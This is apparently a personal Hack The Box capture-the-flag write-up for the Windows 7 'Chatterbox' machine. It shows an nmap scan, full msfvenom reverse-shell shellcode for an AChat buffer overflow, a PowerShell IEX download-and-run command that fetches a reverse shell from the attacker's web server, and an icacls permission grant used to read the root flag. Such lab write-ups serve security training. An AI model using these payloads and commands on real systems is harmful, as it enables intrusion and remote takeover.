# Chatterbox - Medium

Target IP: **10.129.82.24**

## User Flag

Initial scan: ```sudo nmap -sC -sV -p- 10.129.82.24 -v```

Output shows quite a few ports. Ports 9255 and 9256 are interesting, running a service I haven't seen before called AChat.

```
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
9255/tcp  open  http         AChat chat system httpd
|_http-title: Site doesn't have a title.
|_http-server-header: AChat
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Unknown favicon MD5: 0B6115FAE5429FEB9A494BEE6B18ABBE
9256/tcp  open  achat        AChat chat system
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
Service Info: Host: CHATTERBOX; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Chatterbox
|   NetBIOS computer name: CHATTERBOX\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-10-14T15:17:01-04:00
| smb2-time: 
|   date: 2026-10-14T19:17:03
|_  start_date: 2026-10-14T19:12:39
|_clock-skew: mean: 6h19m32s, deviation: 2h18m34s, median: 4h59m31s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
```

I can't directly navigate to port 9255, but searchsploit gives us back some results for Achat.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-egkfqqxzrm]─[~]
└──╼ [★]$ searchsploit achat
------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                              |  Path
------------------------------------------------------------------------------------------------------------ ---------------------------------
Achat 0.150 beta7 - Remote Buffer Overflow                                                                  | windows/remote/36025.py
Achat 0.150 beta7 - Remote Buffer Overflow (Metasploit)                                                     | windows/remote/36056.rb
MataChat - 'input.php' Multiple Cross-Site Scripting Vulnerabilities                                        | php/webapps/32958.txt
Parachat 5.5 - Directory Traversal                                                                          | php/webapps/24647.txt
------------------------------------------------------------------------------------------------------------ ---------------------------------
Shellcodes: No Results
```

To use the buffer overflow exploit, we will need to generate our own shellcode.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-egkfqqxzrm]─[~]
└──╼ [★]$ msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=10.10.15.194 LPORT=4444 -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x86/unicode_mixed
x86/unicode_mixed succeeded with size 834 (iteration=0)
x86/unicode_mixed chosen with final size 834
Payload size: 834 bytes
Final size of python file: 4117 bytes
buf =  b""
buf += b"\x50\x50\x59\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41\x49\x41"
buf += b"\x49\x41\x49\x41\x49\x41\x49\x41\x6a\x58\x41\x51"
buf += b"\x41\x44\x41\x5a\x41\x42\x41\x52\x41\x4c\x41\x59"
buf += b"\x41\x49\x41\x51\x41\x49\x41\x51\x41\x49\x41\x68"
buf += b"\x41\x41\x41\x5a\x31\x41\x49\x41\x49\x41\x4a\x31"
buf += b"\x31\x41\x49\x41\x49\x41\x42\x41\x42\x41\x42\x51"
buf += b"\x49\x31\x41\x49\x51\x49\x41\x49\x51\x49\x31\x31"
buf += b"\x31\x41\x49\x41\x4a\x51\x59\x41\x5a\x42\x41\x42"
buf += b"\x41\x42\x41\x42\x41\x42\x6b\x4d\x41\x47\x42\x39"
buf += b"\x75\x34\x4a\x42\x69\x6c\x37\x78\x44\x4f\x49\x70"
buf += b"\x6d\x30\x4b\x50\x6f\x70\x73\x59\x4b\x35\x6e\x51"
buf += b"\x46\x72\x30\x64\x32\x6b\x42\x32\x70\x30\x32\x6b"
buf += b"\x32\x32\x7a\x6c\x34\x4b\x62\x32\x5a\x74\x44\x4b"
buf += b"\x31\x62\x4c\x68\x70\x31\x6b\x4f\x4a\x6f\x78\x37"
buf += b"\x4e\x6a\x4e\x46\x70\x31\x77\x50\x66\x4c\x4d\x6c"
buf += b"\x73\x31\x71\x6c\x39\x72\x4c\x6c\x4f\x30\x45\x71"
buf += b"\x38\x4f\x6a\x6d\x4b\x51\x38\x47\x71\x39\x70\x75"
buf += b"\x58\x6f\x6e\x72\x51\x47\x42\x6b\x51\x42\x6e\x30"
buf += b"\x62\x6b\x70\x42\x6f\x4c\x6a\x61\x76\x70\x74\x4b"
buf += b"\x31\x30\x52\x58\x52\x65\x39\x30\x71\x64\x50\x4c"
buf += b"\x6a\x61\x46\x70\x74\x4b\x70\x58\x6d\x50\x49\x71"
buf += b"\x7a\x33\x72\x6b\x6e\x68\x4d\x48\x32\x30\x53\x55"
buf += b"\x46\x69\x42\x54\x6f\x4c\x6e\x51\x6b\x4f\x61\x39"
buf += b"\x42\x6b\x4f\x44\x42\x6b\x59\x71\x69\x46\x6d\x61"
buf += b"\x69\x30\x36\x4c\x49\x31\x68\x4f\x4c\x4d\x6b\x51"
buf += b"\x79\x37\x70\x38\x69\x50\x34\x35\x6a\x54\x7a\x63"
buf += b"\x53\x4d\x4b\x48\x6d\x6b\x71\x6d\x4f\x34\x70\x75"
buf += b"\x49\x50\x72\x38\x72\x6b\x72\x38\x6c\x64\x4a\x61"
buf += b"\x79\x43\x53\x36\x54\x4b\x4c\x4c\x70\x4b\x62\x6b"
buf += b"\x4f\x68\x6d\x4c\x4d\x31\x38\x53\x64\x4b\x5a\x64"
buf += b"\x52\x6b\x49\x71\x76\x70\x74\x49\x6f\x54\x4e\x44"
buf += b"\x4b\x74\x6f\x6b\x31\x4b\x61\x51\x6f\x69\x4f\x6a"
buf += b"\x52\x31\x6b\x4f\x4b\x30\x51\x48\x6f\x6f\x61\x4a"
buf += b"\x32\x6b\x4d\x42\x4a\x49\x61\x70\x59\x6f\x69\x6f"
buf += b"\x69\x6f\x31\x4d\x30\x68\x4d\x63\x6e\x52\x39\x70"
buf += b"\x79\x70\x33\x38\x30\x77\x30\x73\x70\x32\x51\x4f"
buf += b"\x61\x44\x31\x58\x6e\x6c\x71\x67\x6d\x56\x4b\x57"
buf += b"\x33\x59\x5a\x48\x4b\x4f\x48\x50\x64\x78\x44\x50"
buf += b"\x5a\x61\x6d\x30\x6b\x50\x4e\x49\x45\x74\x62\x34"
buf += b"\x50\x50\x32\x48\x6f\x39\x75\x30\x50\x6b\x6b\x50"
buf += b"\x39\x6f\x68\x55\x51\x5a\x6c\x4a\x31\x58\x59\x7a"
buf += b"\x4a\x6a\x6a\x6f\x55\x72\x6f\x78\x6b\x52\x69\x70"
buf += b"\x6c\x51\x4f\x6c\x35\x39\x48\x66\x42\x30\x4e\x70"
buf += b"\x50\x50\x62\x30\x6f\x50\x50\x50\x71\x30\x6e\x70"
buf += b"\x51\x58\x47\x7a\x7a\x6f\x39\x4f\x49\x50\x39\x6f"
buf += b"\x59\x45\x75\x47\x70\x6a\x6a\x70\x30\x56\x62\x37"
buf += b"\x63\x38\x34\x59\x47\x35\x63\x44\x53\x31\x49\x6f"
buf += b"\x37\x65\x64\x45\x49\x30\x44\x34\x79\x7a\x49\x6f"
buf += b"\x50\x4e\x39\x78\x34\x35\x48\x6c\x79\x58\x30\x67"
buf += b"\x4b\x50\x6b\x50\x59\x70\x30\x6a\x6d\x30\x70\x6a"
buf += b"\x4a\x64\x70\x56\x31\x47\x30\x68\x7a\x62\x48\x59"
buf += b"\x79\x38\x31\x4f\x59\x6f\x79\x45\x52\x63\x59\x68"
buf += b"\x79\x70\x33\x4e\x6e\x56\x42\x6b\x30\x36\x6f\x7a"
buf += b"\x6d\x70\x62\x48\x49\x70\x4c\x50\x59\x70\x39\x70"
buf += b"\x71\x46\x50\x6a\x49\x70\x4f\x78\x32\x38\x54\x64"
buf += b"\x52\x33\x39\x55\x59\x6f\x5a\x35\x53\x63\x71\x43"
buf += b"\x50\x6a\x69\x70\x42\x36\x31\x43\x31\x47\x61\x58"
buf += b"\x4c\x42\x66\x79\x56\x68\x61\x4f\x6b\x4f\x48\x55"
buf += b"\x53\x53\x6c\x38\x69\x70\x61\x6d\x6b\x78\x61\x48"
buf += b"\x42\x48\x79\x70\x51\x30\x6d\x30\x6d\x30\x50\x6a"
buf += b"\x39\x70\x72\x30\x70\x68\x4a\x6b\x6c\x6f\x5a\x6f"
buf += b"\x4e\x50\x4b\x4f\x5a\x35\x31\x47\x6f\x78\x71\x65"
buf += b"\x62\x4e\x6e\x6d\x53\x31\x69\x6f\x67\x65\x4f\x6e"
buf += b"\x51\x4e\x39\x6f\x4a\x6c\x6f\x34\x6c\x4f\x42\x65"
buf += b"\x32\x50\x6b\x4f\x49\x6f\x79\x6f\x57\x79\x63\x6b"
buf += b"\x59\x6f\x49\x6f\x4b\x4f\x39\x71\x75\x73\x4e\x49"
buf += b"\x67\x56\x72\x55\x79\x31\x45\x73\x45\x6b\x7a\x50"
buf += b"\x74\x75\x46\x42\x70\x56\x52\x4a\x4b\x50\x4e\x73"
buf += b"\x49\x6f\x66\x75\x41\x41"
```

We can now replace the payload in the script with these bytes.

After running the script, we do get a connection but dies immediately.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-egkfqqxzrm]─[~]
└──╼ [★]$ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.82.24 49158
whoami
```

This might be because the Achat process we are on dies after running the exploit. To get around this, we can have the remote machine download a script from our webserver then immediately run it in memory as a new process using IEX.

Let's download a [PowerShell reverse shell script](https://raw.githubusercontent.com/martinsohn/PowerShell-reverse-shell/refs/heads/main/powershell-reverse-shell.ps1).

Generate the payload again, with the command that we want to run.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-egkfqqxzrm]─[~]
└──╼ [★]$ msfvenom -a x86 --platform Windows -p windows/exec CMD="powershell \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.15.194:8000/shell.ps1')\"" -e x86/unicode_mixed -b '\x00\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff' BufferRegister=EAX -f python
```

After running the script, we get a download on our web server, then a connection on our listener as ```alfred```.

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-egkfqqxzrm]─[~]
└──╼ [★]$ python2 36025.py 
---->{P00F}!
```

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-egkfqqxzrm]─[~]
└──╼ [★]$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.82.24 - - [14/Oct/2026 10:40:42] "GET /shell.ps1 HTTP/1.1" 200 -
```

```
┌─[us-dedivip-5]─[10.10.15.194]─[htb-mp-3199654@htb-egkfqqxzrm]─[~]
└──╼ [★]$ rlwrap nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.82.24 49160
SHELL> whoami
chatterbox\alfred
```

We can proceed to get the user flag from here.

## Root Flag

Alfred has full permissions over the administrator desktop folder, but we can't read the flag directly.

```
SHELL> cd C:\users\administrator
SHELL> icacls desktop
desktop NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
        CHATTERBOX\Administrator:(I)(OI)(CI)(F)
        BUILTIN\Administrators:(I)(OI)(CI)(F)
        CHATTERBOX\Alfred:(I)(OI)(CI)(F)

Successfully processed 1 files; Failed processing 0 files
```

```
SHELL> icacls root.txt
root.txt CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files
```

We can simply give ourselves permissions to the flag and then read it.

```
SHELL> icacls root.txt /grant alfred:F
processed file: root.txt
Successfully processed 1 files; Failed processing 0 files
SHELL> icacls root.txt
root.txt CHATTERBOX\Alfred:(F)
         CHATTERBOX\Administrator:(F)

Successfully processed 1 files; Failed processing 0 files
```

We can proceed to get the root flag from here.

Nice pwn!

## Contact

Email: <johnyang4406@gmail.com>, <john_s_yang@brown.edu>

LinkedIn: <https://www.linkedin.com/in/john-yang-747726292/>

HackTheBox: <https://profile.hackthebox.com/profile/019c423f-9b9b-708f-8b31-55983b89dddd?utm_medium=copy_url/>
